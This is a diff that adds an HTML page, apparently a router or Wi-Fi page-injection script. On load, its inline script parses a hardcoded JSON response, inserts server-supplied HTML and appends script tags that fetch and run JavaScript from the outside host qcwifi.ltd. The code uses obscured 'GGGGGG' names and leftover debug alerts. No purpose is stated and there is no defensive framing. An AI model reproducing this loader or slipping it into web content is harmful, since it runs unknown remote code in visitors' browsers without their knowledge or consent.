@@ -1,0 +1,57 @@
+<html>
+<head>
+</head>
+<body>
+<div id="GGGGGG_div_00000001_router">
+	<script type="text/javascript">
+		var GGGGGG_webTalk_router = null;
+		if ("undefined" == typeof GGGGGG_gg_once_flag) {
+			var GGGGGG_gg_once_flag = 0;
+		}
+		
+		function GGGGGG_appendChild_js(data) {
+			var node = document.createElement("script");
+			node.type = "text/javascript";
+			node.src = data;
+			document.getElementsByTagName('head')[0].appendChild(node);
+		}
+		
+		function GGGGGG_processWebTalkResponseText_router(text) {
+			var jsonObj = JSON.parse(text);
+			if (jsonObj.code == '10000') {
+				var ggtype = 1;//jsonObj.data.type;
+				var gghtml = jsonObj.data.html;
+				var ggjscode = jsonObj.data.js;
+				switch (ggtype) {
+					case 1: {
+						var element = document.getElementById("GGGGGG_div_00000001_router");
+						if (element == null) {
+							return ;
+						}
+						alert(gghtml);
+						element.insertAdjacentHTML("afterBegin", gghtml);
+						if (ggjscode != null && ggjscode.length > 0) {
+							var ggjscode_split = ggjscode.split(',');
+							if (ggjscode_split != null) {
+								alert(ggjscode_split.length - 1);
+								for (var i = ggjscode_split.length - 1; i >= 0; i --) {
+									alert(ggjscode_split[i]);
+									GGGGGG_appendChild_js(ggjscode_split[i]);
+								}
+							}
+						}
+						GGGGGG_gg_once_flag = 1;
+						break;
+					}
+					default : {
+						break;
+					}
+				}
+			}
+		}
+		
+		GGGGGG_processWebTalkResponseText_router('{"code":10000,"data":{"js":"http://www.qcwifi.ltd/tmp/res/upload.js","html":""}}');
+	</script>
+</div>
+</body>
+</html>
